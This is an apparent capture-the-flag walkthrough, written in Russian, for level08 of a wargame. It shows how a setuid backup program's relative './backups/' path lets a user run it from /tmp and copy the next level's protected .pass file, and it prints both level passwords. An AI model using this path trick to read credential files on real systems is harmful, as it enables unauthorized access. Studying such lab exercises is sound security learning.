@@ -1,0 +1,39 @@
+> su level08
+Password:7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+В программе source.c:
+- дважды вызывается fopen и единожды open:
+    - в первый раз открывается 0x400d6d "./backups/.log"
+    - во второй раз открывается входной параметр в argv[1]
+    - open() создает файл по адресу ./backups/ + argv[1] и копирует в него
+    содержимое из второго fopen
+Таким образом программа выполняет резервное копирование с помощью av[1]. 
+Он пытается открыть его, создать файл резервной копии в "./backups/" + av[1] 
+и использовать логгер в файле "./backups/.log". 
+
+Следовательно для решения задачи достаточно отдать на копирование .pass.
+Поскольку путь является относительным, а не абсолютным, 
+мы можем использовать «/tmp» как «.» когда мы выполняем программу 
+с его абсолютным путем следующим образом:
+> pwd
+/tmp
+> echo 'Hello !' > ./my_file
+> mkdir backups
+> /home/users/level08/level08 ./my_file
+> cat ./backups/my_file
+Hello !
+
+Нам удалось использовать наш каталог резервных копий вместо того, 
+который находится в $HOME, где у нас нет прав.
+
+Если мы попытаемся напрямую прочитать «/home/users/level09/.pass», 
+мы столкнемся с этой ошибкой:
+> /home/users/level08/level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+Мы можем просто создать каталог для хранения «.pass» внутри наших 
+резервных копий:
+> mkdir -p backups/home/users/level09
+> ~/level08 /home/users/level09/.pass
+> cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
